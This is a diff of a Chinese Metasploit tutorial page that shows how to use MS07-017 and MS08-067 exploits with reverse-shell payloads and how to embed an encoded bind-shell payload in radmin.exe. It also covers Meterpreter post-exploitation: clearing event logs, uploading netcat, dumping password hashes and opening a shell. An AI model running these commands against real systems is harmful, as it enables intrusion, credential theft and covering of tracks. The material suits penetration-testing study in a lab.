+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# cat ms07017.rb </span><br><span class="line">use exploit/windows/browser/ms07_017_ani_loadimage_chunksize</span><br><span class="line"><span class="builtin-name">set</span> URIPATH /</span><br><span class="line"><span class="builtin-name">set</span> SRVHOST 0.0.0.0</span><br><span class="line"><span class="builtin-name">set</span> PAYLOAD windows/shell/reverse_tcp</span><br><span class="line"><span class="builtin-name">set</span> EXITFUNC thread</span><br><span class="line"><span class="builtin-name">set</span> LHOST 10.10.10.131</span><br><span class="line"><span class="builtin-name">set</span> LPORT 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.imgur.com/meKMAdB.png" alt="img"></p>
 <p><img src="https://i.imgur.com/aEu1anZ.png" alt="img"></p>
 <h4 id="6-生成payload"><a href="#6-生成payload" class="headerlink" title="6.生成payload"></a>6.生成payload</h4><ul>
 <li>用法</li>
 </ul>
-<pre><code>msf &gt; search ms08-067
-msf &gt; use payload/windows/shell/bind_tcp
-msf payload(windows/shell/bind_tcp) &gt; generate  #获得shellcode
-msf payload(windows/shell/bind_tcp) &gt; generate -h
-    Usage: generate [options]
-    Generates a payload.
-    OPTIONS:
-        -E        强制编码。
-        -b &lt;opt&gt;  要避免的字符列表：&#39;\ x00 \ xff&#39;
-        -e &lt;opt&gt;  要使用的编码器模块的名称。
-        -f &lt;opt&gt;  输出文件名（否则为stdout）
-        -h        帮助横幅。
-        -i &lt;opt&gt;  编码迭代的次数。
-        -k        保持模板可执行的功能
-        -o &lt;opt&gt;  以VAR = VAL格式逗号分隔的选项列表。
-        -p &lt;opt&gt;  输出平台
-        -s &lt;opt&gt;  NOP sled length.
-        -t &lt;opt&gt;  输出格式: bash,c,csharp,dw,dword,hex,java,js_be,js_le,num,perl,pl,powershell,ps1,py,python,raw,rb,ruby,sh,vbapplication,vbscript,asp,aspx,aspx-exe,axis2,dll,elf,elf-so,exe,exe-only,exe-service,exe-small,hta-psh,jar,jsp,loop-vbs,macho,msi,msi-nouac,osx-app,psh,psh-cmd,psh-net,psh-reflection,vba,vba-exe,vba-psh,vbs,war
-        -x &lt;opt&gt;  要使用的可执行模板
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; <span class="built_in">search</span> ms08-<span class="number">067</span></span><br><span class="line">msf &gt; use payload/windows/<span class="keyword">shell</span>/bind_tcp</span><br><span class="line">msf payload(windows/<span class="keyword">shell</span>/bind_tcp) &gt; generate  #获得shellcode</span><br><span class="line">msf payload(windows/<span class="keyword">shell</span>/bind_tcp) &gt; generate -h</span><br><span class="line">    Usage: generate [<span class="keyword">options</span>]</span><br><span class="line">    Generates <span class="keyword">a</span> payload.</span><br><span class="line">    OPTIONS:</span><br><span class="line">        -E        强制编码。</span><br><span class="line">        -<span class="keyword">b</span> <span class="symbol">&lt;opt&gt;</span>  要避免的字符列表：<span class="string">'\ x00 \ xff'</span></span><br><span class="line">        -<span class="keyword">e</span> <span class="symbol">&lt;opt&gt;</span>  要使用的编码器模块的名称。</span><br><span class="line">        -<span class="keyword">f</span> <span class="symbol">&lt;opt&gt;</span>  输出文件名（否则为stdout）</span><br><span class="line">        -h        帮助横幅。</span><br><span class="line">        -i <span class="symbol">&lt;opt&gt;</span>  编码迭代的次数。</span><br><span class="line">        -<span class="keyword">k</span>        保持模板可执行的功能</span><br><span class="line">        -<span class="keyword">o</span> <span class="symbol">&lt;opt&gt;</span>  以VAR = VAL格式逗号分隔的选项列表。</span><br><span class="line">        -<span class="keyword">p</span> <span class="symbol">&lt;opt&gt;</span>  输出平台</span><br><span class="line">        -s <span class="symbol">&lt;opt&gt;</span>  NOP sled length.</span><br><span class="line">        -t <span class="symbol">&lt;opt&gt;</span>  输出格式: bash,<span class="keyword">c</span>,csharp,dw,dword,hex,java,js_be,js_le,num,<span class="keyword">perl</span>,pl,powershell,ps1,<span class="keyword">py</span>,<span class="keyword">python</span>,raw,rb,<span class="keyword">ruby</span>,<span class="keyword">sh</span>,vbapplication,vbscript,asp,aspx,aspx-<span class="keyword">exe</span>,axis2,dll,elf,elf-<span class="keyword">so</span>,<span class="keyword">exe</span>,<span class="keyword">exe</span>-<span class="keyword">only</span>,<span class="keyword">exe</span>-service,<span class="keyword">exe</span>-small,hta-psh,jar,jsp,loop-vbs,macho,msi,msi-nouac,osx-app,psh,psh-cmd,psh-net,psh-reflection,vba,vba-<span class="keyword">exe</span>,vba-psh,vbs,war</span><br><span class="line">        -<span class="keyword">x</span> <span class="symbol">&lt;opt&gt;</span>  要使用的可执行模板</span><br><span class="line"></span><br><span class="line">msf payload(windows/<span class="keyword">shell</span>/bind_tcp) &gt; generate</span><br></pre></td></tr></table></figure>
 
-msf payload(windows/shell/bind_tcp) &gt; generate</code></pre><p><img src="https://i.imgur.com/wEztOAj.png" alt="img"></p>
+<p><img src="https://i.imgur.com/wEztOAj.png" alt="img"></p>
 <ul>
 <li>自动绕过坏字符</li>
 </ul>
-<pre><code>msf payload(windows/shell/bind_tcp) &gt; generate -b &#39;\x00&#39;
-msf payload(windows/shell/bind_tcp) &gt; generate -b &#39;\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b&#39;</code></pre><ul>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf payload(windows/shell/bind_tcp) &gt; generate -b '<span class="symbol">\x</span>00'</span><br><span class="line">msf payload(windows/shell/bind_tcp) &gt; generate -b '<span class="symbol">\x</span>00<span class="symbol">\x</span>44<span class="symbol">\x</span>67<span class="symbol">\x</span>66<span class="symbol">\x</span>fa<span class="symbol">\x</span>01<span class="symbol">\x</span>e0<span class="symbol">\x</span>44<span class="symbol">\x</span>67<span class="symbol">\x</span>a1<span class="symbol">\x</span>a2<span class="symbol">\x</span>a3<span class="symbol">\x</span>75<span class="symbol">\x</span>4b'</span><br></pre></td></tr></table></figure>
+
+<ul>
 <li>手动指定编码模块</li>
 </ul>
-<pre><code>msf payload(windows/shell/bind_tcp) &gt; show encoders</code></pre><p><img src="https://i.imgur.com/siajCwd.png" alt="img"></p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf payload(windows/<span class="keyword">shell</span><span class="bash">/bind_tcp) &gt; show encoders</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.imgur.com/siajCwd.png" alt="img"></p>
 <ul>
 <li>注入文件</li>
 </ul>
-<pre><code>msf payload(windows/shell/bind_tcp) &gt; generate -b &#39;\x00&#39; -t exe -e x86/shikata_ga_nai -i 5 -k -x /usr/share/windows-binaries/radmin.exe -f /root/1.exe</code></pre><ul>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf payload(windows<span class="regexp">/shell/</span>bind_tcp) &gt; generate -b <span class="string">'\x00'</span> -t exe -e x86<span class="regexp">/shikata_ga_nai -i 5 -k -x /u</span>sr<span class="regexp">/share/</span>windows-binaries<span class="regexp">/radmin.exe -f /</span>root<span class="regexp">/1.exe</span></span><br></pre></td></tr></table></figure>
+
+<ul>
 <li><p>NOP：no-operation / Next Operation （无任何操作）</p>
 <ul>
 <li>EIP 返回存储 NOP sled 的任意地址时将递增，最终导致 shellcode 执行</li>
 <li>增加一行 EOP</li>
 </ul>
-<pre><code>msf payload(windows/shell/bind_tcp) &gt; generate -s 14</code></pre></li>
+<figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf payload(windows/shell/bind_tcp) &gt; <span class="keyword">generate</span> -s <span class="number">14</span></span><br></pre></td></tr></table></figure>
+
+</li>
 </ul>
 <h4 id="7-metepreter"><a href="#7-metepreter" class="headerlink" title="7. metepreter"></a>7. metepreter</h4><h5 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h5><ul>
 <li>高级、动态、可扩展的 payload<ul>
@@ -833,222 +624,45 @@ msf payload(windows/shell/bind_tcp) &gt; generate -b &#39;\x00\x44\x67\x66\xfa\x
 <li>服务端使用 c 语言编写</li>
 <li>客户端提供基于 ruby 的全特性 API（支持任何语言）</li>
 </ul>
-<h5 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h5><pre><code>root@kali:~# cat metepreter.rb 
-use exploit/windows/smb/ms08_067_netapi
-set payload windows/meterpreter/reverse_tcp
-set RHOST 10.10.10.147
-set LHOST 10.10.10.131
-run</code></pre><p><img src="https://i.imgur.com/b9G8Uq6.png" alt="img"></p>
+<h5 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h5><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# cat metepreter.rb </span><br><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line"><span class="keyword">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="keyword">set</span> RHOST <span class="number">10.10</span><span class="number">.10</span><span class="number">.147</span></span><br><span class="line"><span class="keyword">set</span> LHOST <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.imgur.com/b9G8Uq6.png" alt="img"></p>
 <ul>
 <li>帮助文件</li>
 </ul>
-<pre><code>meterpreter &gt; help
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; help</span><br><span class="line"></span><br><span class="line">核心命令</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line"><span class="code">    命令                     描述</span></span><br><span class="line"><span class="code">    -------                   -----------</span></span><br><span class="line"><span class="code">    ?                         帮助菜单</span></span><br><span class="line"><span class="code">    background                背景当前会话</span></span><br><span class="line"><span class="code">    bgkill                    杀死一个背景meterpreter脚本</span></span><br><span class="line"><span class="code">    bglist                    列出运行后台脚本</span></span><br><span class="line"><span class="code">    bgrun                     执行一个meterpreter脚本作为后台线程</span></span><br><span class="line"><span class="code">    channel                   显示信息或控制活动频道</span></span><br><span class="line"><span class="code">    close                     关闭频道</span></span><br><span class="line"><span class="code">    disable_unicode_encoding  禁用unicode字符串的编码</span></span><br><span class="line"><span class="code">    enable_unicode_encoding   启用unicode字符串的编码</span></span><br><span class="line"><span class="code">    exit                      终止meterpreter会话</span></span><br><span class="line"><span class="code">    get_timeouts              获取当前会话超时值</span></span><br><span class="line"><span class="code">    guid                      获取会话GUID</span></span><br><span class="line"><span class="code">    help                      帮助菜单</span></span><br><span class="line"><span class="code">    info                      显示有关Post模块的信息</span></span><br><span class="line"><span class="code">    irb                       进入irb脚本模式</span></span><br><span class="line"><span class="code">    load                      加载一个或多个meterpreter扩展</span></span><br><span class="line"><span class="code">    machine_id                获取连接到会话的计算机的MSF ID</span></span><br><span class="line"><span class="code">    migrate                   将服务器迁移到另一个进程</span></span><br><span class="line"><span class="code">    pivot                     管理数据透视监听器</span></span><br><span class="line"><span class="code">    quit                      终止meterpreter会话</span></span><br><span class="line"><span class="code">    read                      从频道读取数据</span></span><br><span class="line"><span class="code">    resource                  运行存储在文件中的命令</span></span><br><span class="line"><span class="code">    run                       执行meterpreter脚本或Post模块</span></span><br><span class="line"><span class="code">    sessions                  快速切换到另一个会话</span></span><br><span class="line"><span class="code">    set_timeouts              设置当前会话超时值</span></span><br><span class="line"><span class="code">    sleep                     Force Meterpreter安静，然后重新建立会话。</span></span><br><span class="line"><span class="code">    transport                 更改当前的传输机制</span></span><br><span class="line"><span class="code">    use                       不推荐使用“加载”别名</span></span><br><span class="line"><span class="code">    uuid                      获取当前会话的UUID</span></span><br><span class="line"><span class="code">    write                     将数据写入通道</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: 文件系统命令</span><br><span class="line">============================</span><br><span class="line"></span><br><span class="line"><span class="code">    命令          描述</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    cat           将文件的内容读取到屏幕上</span></span><br><span class="line"><span class="code">    cd            更改目录</span></span><br><span class="line"><span class="code">    checksum      检索文件的校验和</span></span><br><span class="line"><span class="code">    cp            将源复制到目标</span></span><br><span class="line"><span class="code">    dir           列表文件（ls的别名）</span></span><br><span class="line"><span class="code">    download      下载文件或目录</span></span><br><span class="line"><span class="code">    edit          编辑一个文件</span></span><br><span class="line"><span class="code">    getlwd        打印本地工作目录</span></span><br><span class="line"><span class="code">    getwd         打印工作目录</span></span><br><span class="line"><span class="code">    lcd           更改本地工作目录</span></span><br><span class="line"><span class="code">    lls           列出本地文件</span></span><br><span class="line"><span class="code">    lpwd          打印本地工作目录</span></span><br><span class="line"><span class="code">    ls            列出文件</span></span><br><span class="line"><span class="code">    mkdir         建立目录</span></span><br><span class="line"><span class="code">    mv            将源移到目标</span></span><br><span class="line"><span class="code">    pwd           打印工作目录</span></span><br><span class="line"><span class="code">    rm            删除指定的文件</span></span><br><span class="line"><span class="code">    rmdir         删除目录</span></span><br><span class="line"><span class="code">    search        搜索文件</span></span><br><span class="line"><span class="code">    show_mount    列出所有安装点/逻辑驱动器</span></span><br><span class="line"><span class="code">    upload        上传文件或目录</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: 网络命令</span><br><span class="line">===========================</span><br><span class="line"></span><br><span class="line"><span class="code">    命令          描述</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    arp           显示主机ARP缓存</span></span><br><span class="line"><span class="code">    getproxy      显示当前的代理配置</span></span><br><span class="line"><span class="code">    ifconfig      显示界面</span></span><br><span class="line"><span class="code">    ipconfig      显示界面</span></span><br><span class="line"><span class="code">    netstat       显示网络连接</span></span><br><span class="line"><span class="code">    portfwd       将本地端口转发到远程服务</span></span><br><span class="line"><span class="code">    resolve       解析目标上的一组主机名</span></span><br><span class="line"><span class="code">    route         查看和修改路由表</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: 系统命令</span><br><span class="line">=======================</span><br><span class="line"></span><br><span class="line"><span class="code">    Command       Description</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    clearev       清除事件日志</span></span><br><span class="line"><span class="code">    drop_token    放弃任何活动的模拟令牌。</span></span><br><span class="line"><span class="code">    execute       执行一个命令</span></span><br><span class="line"><span class="code">    getenv        获取一个或多个环境变量值</span></span><br><span class="line"><span class="code">    getpid        获取当前的进程标识符</span></span><br><span class="line"><span class="code">    getprivs      尝试启用当前进程可用的所有权限</span></span><br><span class="line"><span class="code">    getsid        获取运行服务器的用户的SID</span></span><br><span class="line"><span class="code">    getuid        获取服务器正在运行的用户</span></span><br><span class="line"><span class="code">    kill          终止一个过程</span></span><br><span class="line"><span class="code">    localtime     显示目标系统的本地日期和时间</span></span><br><span class="line"><span class="code">    pgrep         按名称过滤进程</span></span><br><span class="line"><span class="code">    pkill         按名称终止进程</span></span><br><span class="line"><span class="code">    ps            列出运行的进程</span></span><br><span class="line"><span class="code">    reboot        重新启动远程计算机</span></span><br><span class="line"><span class="code">    reg           修改远程注册表并与之交互</span></span><br><span class="line"><span class="code">    rev2self      在远程机器上调用RevertToSelf（）</span></span><br><span class="line"><span class="code">    shell         放入系统命令外壳</span></span><br><span class="line"><span class="code">    shutdown      关闭远程计算机</span></span><br><span class="line"><span class="code">    steal_token   尝试从目标进程中盗取模拟令牌</span></span><br><span class="line"><span class="code">    suspend       暂停或恢复进程列表</span></span><br><span class="line"><span class="code">    sysinfo       获取有关远程系统的信息，例如OS</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: 用户界面命令</span><br><span class="line">===============================</span><br><span class="line"></span><br><span class="line"><span class="code">    命令          描述</span></span><br><span class="line"><span class="code">    -------        -----------</span></span><br><span class="line"><span class="code">    enumdesktops   列出所有可访问的桌面和窗口工作站</span></span><br><span class="line"><span class="code">    getdesktop     获取当前meterpreter桌面</span></span><br><span class="line"><span class="code">    idletime       返回远程用户闲置的秒数</span></span><br><span class="line"><span class="code">    keyscan_dump   转储按键缓冲区</span></span><br><span class="line"><span class="code">    keyscan_start  开始捕捉击键</span></span><br><span class="line"><span class="code">    keyscan_stop   停止捕获击键</span></span><br><span class="line"><span class="code">    screenshot     获取交互式桌面的屏幕截图</span></span><br><span class="line"><span class="code">    setdesktop     更改meterpreters当前桌面</span></span><br><span class="line"><span class="code">    uictl          控制一些用户界面组件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: Webcam 命令</span><br><span class="line">=======================</span><br><span class="line"></span><br><span class="line"><span class="code">    命令          描述</span></span><br><span class="line"><span class="code">    -------        -----------</span></span><br><span class="line"><span class="code">    record_mic     从默认麦克风录制音频X秒</span></span><br><span class="line"><span class="code">    webcam_chat    开始视频聊天</span></span><br><span class="line"><span class="code">    webcam_list    列出网络摄像头</span></span><br><span class="line"><span class="code">    webcam_snap    从指定的摄像头拍摄快照</span></span><br><span class="line"><span class="code">    webcam_stream  从指定的摄像头播放视频流</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Priv: Elevate Commands</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line"><span class="code">    命令          描述</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    getsystem     尝试将您的特权提升为本地系统的特权。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Priv: 密码数据库命令</span><br><span class="line">================================</span><br><span class="line"></span><br><span class="line"><span class="code">    命令          描述</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    hashdump      转储SAM数据库的内容</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Priv: Timestomp 命令</span><br><span class="line">========================</span><br><span class="line"></span><br><span class="line"><span class="code">    命令          描述</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    timestomp     操纵文件MACE属性</span></span><br></pre></td></tr></table></figure>
 
-核心命令
-=============
-
-    命令                     描述
-    -------                   -----------
-    ?                         帮助菜单
-    background                背景当前会话
-    bgkill                    杀死一个背景meterpreter脚本
-    bglist                    列出运行后台脚本
-    bgrun                     执行一个meterpreter脚本作为后台线程
-    channel                   显示信息或控制活动频道
-    close                     关闭频道
-    disable_unicode_encoding  禁用unicode字符串的编码
-    enable_unicode_encoding   启用unicode字符串的编码
-    exit                      终止meterpreter会话
-    get_timeouts              获取当前会话超时值
-    guid                      获取会话GUID
-    help                      帮助菜单
-    info                      显示有关Post模块的信息
-    irb                       进入irb脚本模式
-    load                      加载一个或多个meterpreter扩展
-    machine_id                获取连接到会话的计算机的MSF ID
-    migrate                   将服务器迁移到另一个进程
-    pivot                     管理数据透视监听器
-    quit                      终止meterpreter会话
-    read                      从频道读取数据
-    resource                  运行存储在文件中的命令
-    run                       执行meterpreter脚本或Post模块
-    sessions                  快速切换到另一个会话
-    set_timeouts              设置当前会话超时值
-    sleep                     Force Meterpreter安静，然后重新建立会话。
-    transport                 更改当前的传输机制
-    use                       不推荐使用“加载”别名
-    uuid                      获取当前会话的UUID
-    write                     将数据写入通道
-
-
-Stdapi: 文件系统命令
-============================
-
-    命令          描述
-    -------       -----------
-    cat           将文件的内容读取到屏幕上
-    cd            更改目录
-    checksum      检索文件的校验和
-    cp            将源复制到目标
-    dir           列表文件（ls的别名）
-    download      下载文件或目录
-    edit          编辑一个文件
-    getlwd        打印本地工作目录
-    getwd         打印工作目录
-    lcd           更改本地工作目录
-    lls           列出本地文件
-    lpwd          打印本地工作目录
-    ls            列出文件
-    mkdir         建立目录
-    mv            将源移到目标
-    pwd           打印工作目录
-    rm            删除指定的文件
-    rmdir         删除目录
-    search        搜索文件
-    show_mount    列出所有安装点/逻辑驱动器
-    upload        上传文件或目录
-
-
-Stdapi: 网络命令
-===========================
-
-    命令          描述
-    -------       -----------
-    arp           显示主机ARP缓存
-    getproxy      显示当前的代理配置
-    ifconfig      显示界面
-    ipconfig      显示界面
-    netstat       显示网络连接
-    portfwd       将本地端口转发到远程服务
-    resolve       解析目标上的一组主机名
-    route         查看和修改路由表
-
-
-Stdapi: 系统命令
-=======================
-
-    Command       Description
-    -------       -----------
-    clearev       清除事件日志
-    drop_token    放弃任何活动的模拟令牌。
-    execute       执行一个命令
-    getenv        获取一个或多个环境变量值
-    getpid        获取当前的进程标识符
-    getprivs      尝试启用当前进程可用的所有权限
-    getsid        获取运行服务器的用户的SID
-    getuid        获取服务器正在运行的用户
-    kill          终止一个过程
-    localtime     显示目标系统的本地日期和时间
-    pgrep         按名称过滤进程
-    pkill         按名称终止进程
-    ps            列出运行的进程
-    reboot        重新启动远程计算机
-    reg           修改远程注册表并与之交互
-    rev2self      在远程机器上调用RevertToSelf（）
-    shell         放入系统命令外壳
-    shutdown      关闭远程计算机
-    steal_token   尝试从目标进程中盗取模拟令牌
-    suspend       暂停或恢复进程列表
-    sysinfo       获取有关远程系统的信息，例如OS
-
-
-Stdapi: 用户界面命令
-===============================
-
-    命令          描述
-    -------        -----------
-    enumdesktops   列出所有可访问的桌面和窗口工作站
-    getdesktop     获取当前meterpreter桌面
-    idletime       返回远程用户闲置的秒数
-    keyscan_dump   转储按键缓冲区
-    keyscan_start  开始捕捉击键
-    keyscan_stop   停止捕获击键
-    screenshot     获取交互式桌面的屏幕截图
-    setdesktop     更改meterpreters当前桌面
-    uictl          控制一些用户界面组件
-
-
-Stdapi: Webcam 命令
-=======================
-
-    命令          描述
-    -------        -----------
-    record_mic     从默认麦克风录制音频X秒
-    webcam_chat    开始视频聊天
-    webcam_list    列出网络摄像头
-    webcam_snap    从指定的摄像头拍摄快照
-    webcam_stream  从指定的摄像头播放视频流
-
-
-Priv: Elevate Commands
-======================
-
-    命令          描述
-    -------       -----------
-    getsystem     尝试将您的特权提升为本地系统的特权。
-
-
-Priv: 密码数据库命令
-================================
-
-    命令          描述
-    -------       -----------
-    hashdump      转储SAM数据库的内容
-
-
-Priv: Timestomp 命令
-========================
-
-    命令          描述
-    -------       -----------
-    timestomp     操纵文件MACE属性</code></pre><ul>
+<ul>
 <li>使用</li>
 </ul>
-<pre><code>meterpreter &gt; execute -f cmd.exe
-meterpreter &gt; ps
-meterpreter &gt; getuid
-meterpreter &gt; getpid
-meterpreter &gt; clearev   # 清除日志
-meterpreter &gt; upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32       # 上传文件
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; execute -f cmd.exe</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; ps</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; getuid</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; getpid</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; clearev   # 清除日志</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32       # 上传文件</span></span><br><span class="line"></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32</span></span><br><span class="line"><span class="attr">msf</span> <span class="string">exploit(windows/smb/ms08_067_netapi) &gt; sessions -l</span></span><br><span class="line"><span class="attr">msf</span> <span class="string">exploit(windows/smb/ms08_067_netapi) &gt; sessions -i 1</span></span><br><span class="line"></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; hashdump  # 读取密码</span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; run post/windows/gather/hashdump  # 读取密码</span></span><br><span class="line"></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; shell</span></span><br></pre></td></tr></table></figure>
 
-meterpreter &gt; upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32
-msf exploit(windows/smb/ms08_067_netapi) &gt; sessions -l
-msf exploit(windows/smb/ms08_067_netapi) &gt; sessions -i 1
-
-meterpreter &gt; hashdump  # 读取密码
-meterpreter &gt; run post/windows/gather/hashdump  # 读取密码
-
-meterpreter &gt; shell</code></pre><p><img src="https://i.imgur.com/lJasRoT.png" alt="img"></p>
+<p><img src="https://i.imgur.com/lJasRoT.png" alt="img"></p>
 <h4 id="Meterpreter-python-扩展"><a href="#Meterpreter-python-扩展" class="headerlink" title="Meterpreter python 扩展"></a>Meterpreter python 扩展</h4><ul>
 <li>2015 年11月份，来自社区贡献</li>
 <li>无需运行环境，在客户端运行原生 python 代码</li>
 <li>使用</li>
 </ul>
-<pre><code>meterpreter &gt; load python
-meterpreter &gt; python_execute &quot;print (&#39;asdasdas&#39;)&quot;
-meterpreter &gt; python_execute &quot;import os; cd = os.getcwd()&quot; -r cd
